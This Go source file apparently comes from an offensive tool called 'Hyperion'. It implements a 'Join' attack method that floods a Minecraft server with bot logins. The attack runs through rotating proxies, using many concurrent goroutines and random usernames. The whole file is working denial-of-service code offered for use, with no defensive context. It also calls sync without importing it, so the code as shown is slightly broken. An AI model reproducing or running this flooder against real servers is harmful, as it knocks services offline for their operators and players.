package methods

import (
	"Hyperion/core"
	"Hyperion/core/proxy"
	"Hyperion/mc"
	"Hyperion/mc/mcutils"
	"Hyperion/mc/packet"
	"Hyperion/utils"
	"log"
	"strconv"
	"time"
)

type Join struct {
	Info         *core.AttackInfo
	ProxyManager *proxy.ProxyManager
}

var shouldRun = false
var handshakePacket packet.Packet

func (join Join) Name() string {
	return "Join"
}

func (join Join) Description() string {
	return "Floods server with bots"
}

func (join Join) Start() {
	utils.Init()
	shouldRun = true

	port, err := strconv.Atoi(join.Info.Port)
	if err != nil {
		log.Fatal(err)
	}

	handshakePacket = mcutils.GetHandshakePacket(join.Info.Ip, port, join.Info.Protocol, mcutils.Login)

	var wg sync.WaitGroup
	goroutinePool := make(chan struct{}, join.Info.Loops)
	for i := 0; i < join.Info.Loops; i++ {
		goroutinePool <- struct{}{}
	}
	wg.Add(join.Info.Loops)
	for i := 0; i < join.Info.Loops; i++ {
		go func() {
			defer wg.Done()
			for shouldRun {
				<-goroutinePool
				for j := 0; j < join.Info.PerDelay; j++ {
					loop(&join)
				}
				time.Sleep(join.Info.Delay)
				goroutinePool <- struct{}{}
			}
		}()
	}
	wg.Wait()
}

func loop(join *Join) {
	proxy := join.ProxyManager.GetNext()
	goroutinePool := make(chan struct{}, join.Info.ConnPerProxy)
	for i := 0; i < join.Info.ConnPerProxy; i++ {
		goroutinePool <- struct{}{}
	}
	for i := 0; i < join.Info.ConnPerProxy; i++ {
		go func(proxy *proxy.Proxy) {
			defer func() { goroutinePool <- struct{}{} }() // Release the goroutine back to the pool
			<-goroutinePool // Wait for an available goroutine
			err := connect(&join.Info.Ip, &join.Info.Port, join.Info.Protocol, proxy)
			if err != nil {
				log.Printf("error connecting: %v", err)
			}
		}(proxy)
	}
}

func connect(ip *string, port *string, protocol int, proxy *proxy.Proxy) error {

	conn, err := mc.DialMCNonBlocking(ip, port, proxy)
	if err != nil {
		log.Printf("connection error: %v", err)
		return err
	}

	packetBuffer := make([]byte, 0)
	packetBuffer = append(packetBuffer, handshakePacket.Data...)
	packetBuffer = append(packetBuffer, mcutils.GetLoginPacket(utils.RandomName(16), protocol).Data...)

	_, err = conn.Write(packetBuffer)
	if err != nil {
		log.Printf("write error: %v", err)
		return err
	}
	return nil
}

func (join Join) Stop() {
	shouldRun = false
}
